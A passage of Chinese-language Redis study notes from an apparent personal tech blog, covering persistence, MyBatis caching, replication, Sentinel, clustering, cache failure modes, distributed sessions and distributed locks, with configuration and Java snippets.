title=\"客户端shutdown\"></a>客户端shutdown</h5><p>当redis通过shutdown指令关闭服务器时，会执行一个save命令，阻塞所有的客户端，不再执行客户端发送的任何命令，并且在<code>save</code>命令后关闭服务器</p>\n<h4 id=\"配置文件-1\"><a href=\"#配置文件-1\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h4><ul>\n<li><p>修改dbfilename修改生成的文件名字</p>\n</li>\n<li><p>修改dir修改生成文件的路径</p>\n</li>\n</ul>\n<h4 id=\"特点\"><a href=\"#特点\" class=\"headerlink\" title=\"特点\"></a>特点</h4><p>缺点：</p>\n<ol>\n<li>RDB每次持久化需要将所有内存数据写入文件，然后替换原有文件，当内存数据量很大的时候，频繁的生成快照会很耗性能。</li>\n<li>如果将生成快照的策略设置的时间间隔很大，会导致redis宕机的时候丢失过的的数据。也就是最后一次快照后的数据</li>\n</ol>\n<p>优点：<br>由于dump.rdb文件是二进制文件，所以当redis服务崩溃恢复的时候，能很快的将文件数据恢复到内存之中。</p>\n<h3 id=\"AOF\"><a href=\"#AOF\" class=\"headerlink\" title=\"AOF\"></a>AOF</h3><h4 id=\"介绍-1\"><a href=\"#介绍-1\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>这种方式可以将所有客户端执行的写命令记录到日志文件中，AOF持久化会将被执行的写命令写到AOF的文件末尾，以此来记录数据发生的变化，因此只要redis从头到为执行一次AOF文件所报好的所有写命令，就可以恢复AOF文件的记录的数据。默认不开启，通过修改配置文件的appendonly为yes</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220607174338373.png\" alt=\"image-20220607174338373\"></p>\n<h4 id=\"追加频率\"><a href=\"#追加频率\" class=\"headerlink\" title=\"追加频率\"></a>追加频率</h4><p>通过修改配置文件的appendsync设置</p>\n<p>1。always【谨慎使用】</p>\n<ul>\n<li><p>说明：每个redis写命令都要同步写入硬盘，严重降低redis速度</p>\n</li>\n<li><p>解释：如果用户使用了always选项，那么每个redis2写命令都会被写入硬盘，从而将发生系统崩溃时出现的数据丢失减到最少；遗憾的<br>是，因为这种同步策略需要对硬盘进行大量的写入操作，所以rdis处理命令的速度会受到硬盘性能的限制；<br>-注意：转盘式硬盘在这种频率下200左右个命令/s;固态硬盘(SSD)几百万个命令/s;<br>-警告：使用SSD用户请谨慎使用always选项，这种模式不断写入少量数据的做法有可能会引发严重的写入放大问题，导致将固态硬盘的<br>寿命从原来的几年降低为几个月。</p>\n</li>\n</ul>\n<p>2.everysec【推荐】</p>\n<ul>\n<li><p>说明：每秒执行一次同步显式的将多个写命令同步到磁盘</p>\n</li>\n<li><p>解释：为了兼顾数据安全和写入性能，用户可以考虑使用everysec选项，让redis每秒一次的频率对AOF文件进行同步；redis每秒同<br>步一次A0F文件时性能和不使用任何持久化特性时的性能相差无几，而通过每秒同步一次AOF文件，redis可以保证，即使系统崩溃，用户最<br>多丢失一秒之内产生的数据。</p>\n</li>\n</ul>\n<p>3.no【不推荐】</p>\n<ul>\n<li>说明：由操作系统决定何时同步</li>\n<li>解释：最后使用no选项，将完全有操作系统决定什么时候同步AOF日志文件，这个选项不会对redis性能带来影响但是系统崩溃时，会丢<br>失不定数量的数据，另外如果用户硬盘处理写入操作不够快的话，当缓冲区被等待写入硬盘数据填满时，rd1s会处于阻塞状态，并导致<br>redis的处理命令请求的速度变慢。</li>\n</ul>\n<h4 id=\"重写\"><a href=\"#重写\" class=\"headerlink\" title=\"重写\"></a>重写</h4><p>AOF的方式也同时带来了另一个问题。持久化文件会变的越来越大。例如我们调用incr testi命令100次，文件中必须保存全部的100条命令，其实有99条都是多余的。因为要恢复数据库的状态其实文件中保存一条set test100就够了。为了压缩aof的持久化文件Redis提供了AOF重写机制。</p>\n<p>AOF重写一定程度上减少了AOF文件的大小</p>\n<p>触发重写的方式 ::first_quarter_moon:</p>\n<blockquote>\n<ol>\n<li>客户端方式重写，执行BGREWRITEAOF命令，不会阻塞Redis的服务</li>\n<li>服务端配置自动触发</li>\n</ol>\n<p>在redis.conf中配置auto-aof-rewrite-percentage</p>\n<p>如果设置auto-aof-rewrite-percentage值为100和auto-aof-rewrite-min-size 64MB,并且启用的A0F持久化时，那么当A0F<br>文件体积大于64M,并且A0F文件的体积比上一次重写之后体积大了至少一倍(100%)时，会自动触发，如果重写过于频繁，用户可以考虑将<br>auto-aof-rewrite-percentage设置为更大</p>\n</blockquote>\n<p><strong>重写原理</strong></p>\n<pre><code>注意：重写aof文件的操作，并没有读取旧的aof文件，而是将整个内存中的数据库内容用命令的方式重写了一个新的aof文件，替换原有的文件这点和快照有点类似。\n</code></pre>\n<p>重写流程<br>1.redis调用fork，现在有父子两个进程，子进程根据内存中的数据库快照，往临时文件中写入重建数据库状态的命令<br>2,父进程继续处理client请求，除了把写命令写入到原来的aof文件中。同时把收到的写命令缓存起来。这样就能保证如果子进程重写<br>失败的话并不会出问题。<br>3，当子进程把快照内容写入已命令方式写到临时文件中后，子进程发信号通知父进程。然后父进程把缓存的写命令也写入到临时文件。<br>4.现在父进程可以使用临时文件替换老的aof文件，并重命名，后面收到的写命令也开始往新的aof文件中追加。</p>\n<p>当aof文件过大时，删除会占用较高资源</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220608201645761.png\" alt=\"image-20220608201645761\"></p>\n<h4 id=\"修复\"><a href=\"#修复\" class=\"headerlink\" title=\"修复\"></a>修复</h4><p>​    如果我们本次操作只是写入了一半数据就出现了系统崩溃问题，不用担心，在Redis下一次启动之前，我们可以通过redis-check-aof工具来帮助我们解决数据一致性的问题。</p>\n<h2 id=\"分布式缓存\"><a href=\"#分布式缓存\" class=\"headerlink\" title=\"分布式缓存\"></a>分布式缓存</h2><p>缓存的概念：</p>\n<p>​    在服务端中，缓存主要是指将数据库的数据加载到内存中，之后对该数据的访问都在内存中完成，从而减少了对数据库的访问；解决了高并发场景中数据库容易成为性能瓶颈的问题；以及基于内存的访问速度高于磁盘的访问速度的原理，提高了数据的访问速度和程序性能。<br>而根据缓存是否与应用程序属于同一进程，可以将内存分为本地缓存和分布式缓存。</p>\n<p>​    本地缓存是在同一个进程内的内存空间中缓存数据，数据读写都是在同一个进程内完成；</p>\n<p>​    缺点：</p>\n<ul>\n<li><p>占用了应用程序的空间比如JVM，无法进行大数据量缓存</p>\n</li>\n<li><p>本地缓存无法被其他应用程序访问，在集群中需要同步更新较为复杂（比如nginx负载均衡会打到不同主机）</p>\n</li>\n<li><p>重启数据丢失</p>\n</li>\n</ul>\n<p>​    分布式缓存是一个独立部署的进程，一般都是与应用进程部署在不同的机器，需要通过网络来完成分布式缓存的数据读写操作的数据传输。</p>\n<p>​    优点：</p>\n<ul>\n<li>支持大量数据存储，不影响应用进程。重启不丢失数据</li>\n<li>数据集中存储，保证了数据的一致性</li>\n<li>数据读写分离，高性能，高可用，避免了因为宕机而数据不可用的问题</li>\n<li>需要网络传输，性能略低</li>\n</ul>\n<p>Redis与Mybatis整合实现分布式缓存，</p>\n<p>Mybatis一级缓存作用域为sqlsession，不同sqlsession无法共享缓存，一般需要开启二级缓存，二级缓存的作用域为sqlsessionfactory，同一个工厂下的sqlsession的缓存能够共享。</p>\n<p>Mybatis开启缓存为在mapper文件中添加<cache/>标签，其中cache的默认实现类是PerpetualCache类，实现类ibatis下的Cache接口，</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220609081252242.png\" alt=\"image-20220609081252242\"></p>\n<p>底层的数据结构为Hashmap，无法用于分布式环境，因此可以通过修改实现类（在cache标签中添加type属性，值为缓存实现类的全限定名），可以结合redis实现分布式缓存。底层调用的仍然是redis的Hashmap</p>\n<blockquote>\n<ol>\n<li><p>先自定义类实现Cache接口</p>\n</li>\n<li><p>添加id成员变量并编写构造函数和getId方法</p>\n<p>id其实是对应mapper文件的namespace比如com.gan.dao.UserDao,相当于redis的hash存储的key，每次查询时会以namespace+当前方法名+执行的sql语句整体作为field（由于这个整体过于冗长，可以取其md5代之）value为查询得到的数据结果    </p>\n</li>\n<li><p>重写cache的get和put方法，通过工具类获得的redistemplate对hash结构进行put和get完成缓存的存取功能</p>\n</li>\n<li><p>增删改需要清除对应的缓存（java会自动调用clear方法），因此需要重写clear方法直接清除id也就是UserDao，那么下次调用相关Dao时没有缓存只能到数据库去获取</p>\n</li>\n</ol>\n</blockquote>\n<p>在上面的缓存中，如果项目中表查询之间没有任何关联查询使用现在的这种缓存方式没有任何问题，但如果表之间有关联则存在一定存在问题？</p>\n<p>因为不同的Dao在增删改时只能删除自己的缓存，不能操作其他Dao对应的缓存</p>\n<p>为了解决这个问题可以将多个有关系的Dao放在同一个id下一起管理，起到牵一发而动全身的效果。</p>\n<p>实现方法通过cache-ref，指向有关联的dao</p>\n<p><code>&lt;cache type=&quot;com.gan.util.RedisCache&quot;/&gt;</code></p>\n<p><code>&lt;cache-ref namespace=&quot;com.gan.dao.TeacherDao&quot;/&gt;</code></p>\n<h2 id=\"主从复制\"><a href=\"#主从复制\" class=\"headerlink\" title=\"主从复制\"></a>主从复制</h2><h3 id=\"介绍-2\"><a href=\"#介绍-2\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>主从复制架构仅仅用来解决数据的冗余备份，从节点基金用来同步数据。主节点用于写，从节点用于读</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220609093731061.png\" alt=\"image-20220609093731061\"></p>\n<p>可以在配置文件中slaveof 也可以在客户端中slaveof</p>\n<p>客户端执行info replication查看主从信息</p>\n<h3 id=\"主从复制特性\"><a href=\"#主从复制特性\" class=\"headerlink\" title=\"主从复制特性\"></a>主从复制特性</h3><h4 id=\"一主两仆\"><a href=\"#一主两仆\" class=\"headerlink\" title=\"一主两仆\"></a>一主两仆</h4><p>如果从服务器突然断开，并且设置从服务器是在命令行的（也就是一次性的，配置文件设置的不是一次性的）那么他会恢复主服务器的身份。最好是在配置文件中配置从服务器，更加稳定。</p>\n<p>从服务器断开连接重连后，会将主服务器的数据全部复制</p>\n<p>主服务器断开连接后，从服务器不会篡位，会等待大哥回归</p>\n<p>复制原理</p>\n<ul>\n<li><p>Slave启动成功连接到master后会发送一个sync命令（主动）</p>\n</li>\n<li><p>Master接到命令启动后台的存盘进程，同时收集所有接收到的用于修改数据集命令，在后台进程执行完毕之后，master将传送整个数据文件到slave,以完成一次完全同步（底层通过rdb文件传输）</p>\n<p>全量复制：而slve服务在接收到数据库文件数据后，将其存盘并加载到内存中。·<br>增量复制：Master继续将新的所有收集到的修改命令依次传给slave,完成同步，<br>但是只要是重新连接master,一次完全同步（全量复制将被自动执行）</p>\n</li>\n</ul>\n<h4 id=\"薪火相传\"><a href=\"#薪火相传\" class=\"headerlink\" title=\"薪火相传\"></a>薪火相传</h4><p>上一个Slave可以是下一个slave的Master,</p>\n<p>Slave同样可以接收其他slaves的连接和同步请求，那么该slave作为了链条中下一个的master,可以有效减轻master的写压力，去中心化降低风险。 用slaveof <ip> <port></p>\n<p>中途变更转向：会清除之前的数据，重新建立拷贝最新的，风险是一旦某个slave宕机，后面的slave都没法备份</p>\n<h4 id=\"反客为主\"><a href=\"#反客为主\" class=\"headerlink\" title=\"反客为主\"></a>反客为主</h4><p>通过slave no one 可以使得从机变主机，需要手动不方便，因此引出了哨兵机制</p>\n<h3 id=\"哨兵机制\"><a href=\"#哨兵机制\" class=\"headerlink\" title=\"哨兵机制\"></a>哨兵机制</h3><h4 id=\"介绍-3\"><a href=\"#介绍-3\" class=\"headerlink\" title=\"介绍\"></a>介绍</h4><p>Sentinel(哨兵）是Redis的高可用性解决方案：由一个或多个Sentinel实例组成的Sentinel系统可以监视任意多个主服务器，<br>以及这些主服务器属下的所有从服务器，并在被监视的主服务器进入下线状态时，自动将下线主服务器属下的某个从服务器升级<br>为新的主服务器。简单的说哨兵就是带有自动故障转移功能的主从架构。</p>\n<p><strong>1.无法解决单节点并发压力问题 2.单节点内存和磁盘的物理上限</strong></p>\n<h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220609112029276.png\" alt=\"image-20220609112029276\"></p>\n<p>搭建过程</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># 1.在主节点上创建哨兵配置</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> 在Master对应redis.conf同目录下新建sentinel.conf文件，名字固定</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\"># 2.配置哨兵，在sentinel.conf文件中填入内容：</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> sentinel monitor 被监控的数据库名(自己起) ip port 2</span><br><span class=\"line\"> 说明：后面的数字2，是指有两个及以上的sentinel服务检测大搜master宕机才会执行主从切换的功能，通常是哨兵数/2 +1（也就是半数以上）</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\"># 3.启动哨兵模式并进行测试</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> redis-sentinel /myredis/sentinel.conf(相当于一个独立的redis服务)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<p>通过springboot操作redis哨兵,根据哨兵获得master节点</p>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># 1.在配置文件中配置</span></span><br><span class=\"line\">spring.redis.sentinel.master =  在sentinel配置文件中配置的名字</span><br><span class=\"line\">spring.redis.sentinel.nodes = ip:port,ip:port...</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<h2 id=\"Redis集群\"><a href=\"#Redis集群\" class=\"headerlink\" title=\"Redis集群\"></a>Redis集群</h2><h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><ul>\n<li>容量不够，redis如何进行扩容？</li>\n<li>并发写操作， redis如何分摊？<br> <strong>另外，主从模式，薪火相传模式，主机宕机，导致ip地址发生变化，应用程序中配置需要修改对应的主机地址、端口等信息。</strong><br> 之前通过<code>代理主机</code>来解决，但是redis3.0中提供了解决方案。就是<code>无中心化集群配置</code>。</li>\n</ul>\n<h3 id=\"介绍-4\"><a href=\"#介绍-4\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><blockquote>\n<p>Redis集群实现了对Redis的水平扩容，即启动N个redis节点，将整个数据库分布存储在这N个节点中，每个节点存储总数据的1/N。（slot的引入对数据进行分配）<br>Redis集群通过分区（partition)来提供一定程度的可用性（availability):即使集群中有一部分节点失效或者无法进行通讯，集群也可以继续处理命令请求。</p>\n</blockquote>\n<h3 id=\"搭建\"><a href=\"#搭建\" class=\"headerlink\" title=\"搭建\"></a>搭建</h3><p>搭建集群至少需要6台redis服务器，3主3从，一共节点，分布式中建议节点的数量为单数，这样投票时更容易做出决策</p>\n<p>步骤：</p>\n<ol>\n<li>生成6个文件夹，不同文件夹放置不同服务器的配置文件</li>\n<li>修改配置如下</li>\n</ol>\n<figure class=\"highlight markdown\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># 1.daemonize yes</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> 开启后台启动</span><br><span class=\"line\"><span class=\"section\"># 2.bind 0.0.0.0</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> 设置可以远程访问</span><br><span class=\"line\"><span class=\"section\"># 3.port 6379</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> 端口号</span><br><span class=\"line\"><span class=\"section\"># 4.appendonly yes</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> 开启AOF持久化</span><br><span class=\"line\"><span class=\"section\"># 5.cluster-enabled yes</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> 开启集群</span><br><span class=\"line\"><span class=\"section\"># 6.cluster-config-file nodes-xxxx.conf</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> 集群配置文件</span><br><span class=\"line\"><span class=\"section\"># 7.cluster-node-timeout 5000</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> 心跳等待时间，超过这个时间就开始投票选举新主节点</span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"3\">\n<li>启动6台服务</li>\n<li>通过自带的ruby命令生成集群,在redis目录下的src文件的redis-trib.rb</li>\n</ol>\n<p><code>./redis-trib.rb create --replicas 1 192.168.1.100:7000 192.168.1.100:7001 .....</code> 把六个服务全写上去</p>\n<p>其中1表示每台主机有多少台从机，1是最简单的方式。</p>\n<p>命令结束后看到 <strong>[OK] ALL 16384 slots covered</strong> 表示成功生成集群</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220609150836867.png\" alt=\"image-20220609150836867\"></p>\n<h3 id=\"集群常用命令\"><a href=\"#集群常用命令\" class=\"headerlink\" title=\"集群常用命令\"></a>集群常用命令</h3><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看某个主机的当前状态</span></span><br><span class=\"line\">./redis-trib.rb check ip:port</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220609151616222.png\" alt=\"image-20220609151616222\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220609151917794.png\" alt=\"image-20220609151917794\"></p>\n<h3 id=\"集群细节\"><a href=\"#集群细节\" class=\"headerlink\" title=\"集群细节\"></a>集群细节</h3><ul>\n<li><p>主节点存在hash slots，且不能被删除，一主可以有多从，不同节点存储的是不一样的数据，主节点宕机时，经过设定好的超时时间后，从节点自动选举出新的主节点，此时就算之前的主节点重新连接回来也只能当从节点</p>\n</li>\n<li><p>从节点没有hash slots,可以被删除，只负责数据的同步与读</p>\n</li>\n</ul>\n<p>客户端连接集群需要添加-c,表示是集群，至于连接集群的哪一台主机都是可以的，集群会根据crc16(key)算法获得key所在槽，并将你操作重定向到该槽所在的主机上</p>\n<p><code>./redis-cli ip -p port -c</code> </p>\n<h3 id=\"整合springboot\"><a href=\"#整合springboot\" class=\"headerlink\" title=\"整合springboot\"></a>整合springboot</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">spring:</span></span><br><span class=\"line\">\t<span class=\"attr\">redis:</span></span><br><span class=\"line\">\t\t<span class=\"attr\">cluster:</span></span><br><span class=\"line\">\t\t\t<span class=\"attr\">nodes:</span> <span class=\"string\">ip1:port1,ip2:port2....</span></span><br><span class=\"line\"><span class=\"comment\"># 最好把集群的节点全部写上去，如果只写一台，恰巧他又宕机了那么就无法连接</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"集群原理\"><a href=\"#集群原理\" class=\"headerlink\" title=\"集群原理\"></a>集群原理</h3><h4 id=\"一致性哈希算法\"><a href=\"#一致性哈希算法\" class=\"headerlink\" title=\"一致性哈希算法\"></a>一致性哈希算法</h4><p><strong>背景：</strong></p>\n<p>​    原来使用hash取模算法，假设有3台服务器s0，s1,s2,对要存储的值进行计算hash然后求余3，将文件均匀分别划分到3台服务器上。这样拓展性较低，如果需要增加一台服务器s3，那么需要计算hash求余4，原来在s0的文件被计算到s3上，明显不对。大量缓存失效会引起缓存雪崩。</p>\n<p>一致性哈希算法将服务器放在环上，将计算得到的结果放在环上，顺时针寻找最近的服务器。这种做法只会使得一部分缓存失效（也就是s2服务器到s3服务器这一段），极大减轻了数据库的压力</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220609162606965.png\" alt=\"image-20220609162606965\"></p>\n<p>但是以上所说的前提是节点均匀地在环上，实际上会有哈希环偏斜的问题，那么很多键会缓存到同一台服务器上，压力过大可能引起系统崩溃</p>\n<blockquote>\n<p>解决方案：</p>\n<ul>\n<li><p>尽可能使用较多的服务器</p>\n</li>\n<li><p>将物理节点映射出虚拟节点，再将虚拟节点投射到哈希环，使得缓存均匀分配，减少哈希环偏斜带来的影响</p>\n</li>\n</ul>\n<p>缓存读写-&gt;虚拟节点-&gt;真实节点  最后才读取</p>\n</blockquote>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220609162849629.png\" alt=\"image-20220609162849629\"></p>\n<h4 id=\"槽-slot\"><a href=\"#槽-slot\" class=\"headerlink\" title=\"槽(slot)\"></a>槽(slot)</h4><p>  Redis集群通过分片的方式来保存数据库中的键值对，集群的整个数据库被分为<strong>16384</strong>个槽，数据库中的每个键都属于这16384个槽的其中一个，集群中的每个节点可以处理至少1个或最多16384个。一个节点相当与一台主机。因此一个集群中最多可以有16384台主机，每个主机只少一个槽。</p>\n<p>​                    <strong>只有当数据库中的16384个槽都有节点在处理时，集群才处于上线状态。</strong></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220609153138567.png\" alt=\"image-20220609153138567\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220609153341131.png\" alt=\"image-20220609153341131\"></p>\n<p>也就是不同的数据会交到不同的槽处理，新添加的节点还没有划分槽，可以以下方法重新分片</p>\n<ul>\n<li><p><code>redis-cli -h 192.168.11.176 -p 7000 --cluster reshard 192.168.11.229:7006 -a 123456</code></p>\n</li>\n<li><p><code>./redis-trib.rb reshard ip:port</code></p>\n</li>\n</ul>\n<p>集群的ping-pong心跳机制保证了高可用性    </p>\n<h2 id=\"缓存异常\"><a href=\"#缓存异常\" class=\"headerlink\" title=\"缓存异常\"></a>缓存异常</h2><table>\n<thead>\n<tr>\n<th>缓存异常</th>\n<th>产生原因</th>\n<th>应对方案</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>缓存雪崩</td>\n<td>大量数据同时过期</td>\n<td>1.均匀设置过期时间，避免同一时间过期<br />2.互斥锁，保证同一时间只有一个应用构建缓存<br />3.双key策略，主key设置过期时间，备key永不过时，主过期返回备</td>\n</tr>\n<tr>\n<td></td>\n<td>Redis故障宕机</td>\n<td>1.服务熔断<br />2.请求限流<br />3.构建Redis缓存高可靠集群</td>\n</tr>\n<tr>\n<td>缓存击穿</td>\n<td>频繁访问的热点数据过期</td>\n<td>1.互斥锁<br />2.热点数据永不过期，后台更新缓存</td>\n</tr>\n<tr>\n<td>缓存穿透</td>\n<td>访问的数据不在缓存也不在数据库（黑客）</td>\n<td>1.限制非法请求<br />2.缓存空值（redis+mybatis会自动缓存）<br />3.布隆过滤器</td>\n</tr>\n</tbody></table>\n<h2 id=\"Redis分布式session\"><a href=\"#Redis分布式session\" class=\"headerlink\" title=\"Redis分布式session\"></a>Redis分布式session</h2><p>springboot把session的管理全程交给Redis，是一个基于应用的整合，与Memcache不一样，memcache是基于tomcat的整合</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220610133116990.png\" alt=\"image-20220610133116990\"></p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20220610133327300.png\" alt=\"image-20220610133327300\"></p>\n<p>实现步骤</p>\n<ol>\n<li>引入依赖</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.session<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-session-data-redis<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<ol start=\"2\">\n<li>开发session管理配置类</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Configuration</span></span><br><span class=\"line\"><span class=\"meta\">@EnableRedisHttpSession</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RedisSessionManager</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>搭建好redis服务集群,在配置文件中配置好连接集群后就可以使用</li>\n</ol>\n<blockquote>\n<p>所有的方法和原来一样，只是由redis去管理，getSession()与setAttribute()方法也一样</p>\n</blockquote>\n<p>4.配置nginx负载均衡，修改多个tomcat的3个端口后，将打好包的war包放到tomcat下，完成分布式session的共享</p>\n<p>注意：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">hello</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">    List&lt;String&gt; list = (List&lt;String&gt;) request.getSession().getAttribute(<span class=\"string\">&quot;list&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(ObjectUtils.isEmpty(list))&#123;</span><br><span class=\"line\">        list = <span class=\"keyword\">new</span> ArrayList&lt;String&gt;();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    list.add(UUID.randomUUID().toString());</span><br><span class=\"line\">    <span class=\"comment\">//注意redis与jvm中的对象不一致</span></span><br><span class=\"line\">    request.getSession().setAttribute(<span class=\"string\">&quot;list&quot;</span>,list);</span><br><span class=\"line\">    response.getWriter().println(list.size());</span><br><span class=\"line\">    response.getWriter().println(<span class=\"string\">&quot;sessionid: &quot;</span>+request.getSession().getId());</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>在getsession()方法中获取到的是redis中的值，如果对list修改了(或者其他session的数据修改了)，那么就要将redis的数据进行同步修改保证数据的一致性。</p>\n<p><strong>原因：</strong>jvm虚拟机与redis是分开的，修改了list属性只是修改了jvm中队上的那个地址对应的空间，没有修改redis的内存，因此要重新设置session属性<code>request.getSession().setAttribute(&quot;list&quot;,list);</code></p>\n<h2 id=\"分布式锁\"><a href=\"#分布式锁\" class=\"headerlink\" title=\"分布式锁\"></a>分布式锁</h2><h3 id=\"分类\"><a href=\"#分类\" class=\"headerlink\" title=\"分类\"></a>分类</h3><p>目前分布式锁的实现方案主要包括三种：</p>\n<ul>\n<li>基于数据库 </li>\n</ul>\n<p>主要是利用数据库的唯一索引来实现，唯一索引天然具有排他性，这刚好符合我们对锁的要求：同一时刻只能允许一个竞争者获取锁。加锁时我们在数据库中插入一条锁记录，利用业务id进行防重。当第一个竞争者加锁成功后，第二个竞争者再来加锁就会抛出唯一索引冲突，如果抛出这个异常，我们就判定当前竞争者加锁失败。防重业务id需要我们自己来定义，例如我们的锁对象是一个方法，则我们的业务防重id就是这个方法的名字，如果锁定的对象是一个类，则业务防重id就是这个类名。</p>\n<ul>\n<li>基于缓存Redis</li>\n</ul>\n<p>理论上来说使用缓存来实现分布式锁的效率最高，加锁速度最快，因为Redis几乎都是纯内存操作，而基于数据库的方案和基于Zookeeper的方案都会涉及到磁盘文件IO，效率相对低下。一般使用Redis来实现分布式锁都是利用Redis的SETNX key value这个命令，只有当key不存在时才会执行成功，如果key已经存在则命令执行失败。</p>\n<ul>\n<li>基于Zookeeper</li>\n</ul>\n<p>Zookeeper一般用作配置中心，其实现分布式锁的原理和Redis类似，我们在Zookeeper中创建瞬时节点，利用节点不能重复创建的特性来保证排他性。</p>\n<p>三种方案比较</p>\n<table>\n<thead>\n<tr>\n<th>方案</th>\n<th>理解难易</th>\n<th>复杂度</th>\n<th>性能</th>\n<th>可靠性</th>\n<th>优点</th>\n<th>缺点</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>数据库</td>\n<td>容易</td>\n<td>复杂</td>\n<td>差</td>\n<td>不可靠</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td>Redis</td>\n<td>一般</td>\n<td>一般</td>\n<td>高</td>\n<td>可靠</td>\n<td>set和del指令较高</td>\n<td>实现复杂，需要考虑原子，超时，误删情形。<br />没有等待队列，只能在客户端自旋效率低下。<br />但是redisson这两缺点相当于没有</td>\n</tr>\n<tr>\n<td>Zookeeper</td>\n<td>难</td>\n<td>简单</td>\n<td>一般</td>\n<td>可靠</td>\n<td>封装好的框架，容易实现，<br />有等待队列提高抢锁效率</td>\n<td>添加和删除节点性能较低</td>\n</tr>\n</tbody></table>\n<p>分布式锁的效率优化</p>\n<ul>\n<li>降低粒度</li>\n<li>读写锁区分</li>\n</ul>\n<h3 id=\"Redis实现\"><a href=\"#Redis实现\" class=\"headerlink\" title=\"Redis实现\"></a>Redis实现</h3><p>核心原理</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">SETEX KEY SECONDS VALUE</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 设置key value并设置超时，如果已经有了该key则覆盖</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 是一个原子性操作，设值与设置生存时间同时完成</span></span><br><span class=\"line\"></span><br><span class=\"line\">SETNX KEY VALUE</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如果key不存在则设置返回1，存在则无法设置返回0</span></span><br></pre></td></tr></table></figure>\n\n<p>这两个命令是redis分布式锁的关键，redisson底层也是通过这两个命令结合lua脚本实现的，lua脚本可以高效率保证redis操作的原子性</p>\n<p>结合体：<code>SET KEY VALUE NX EX 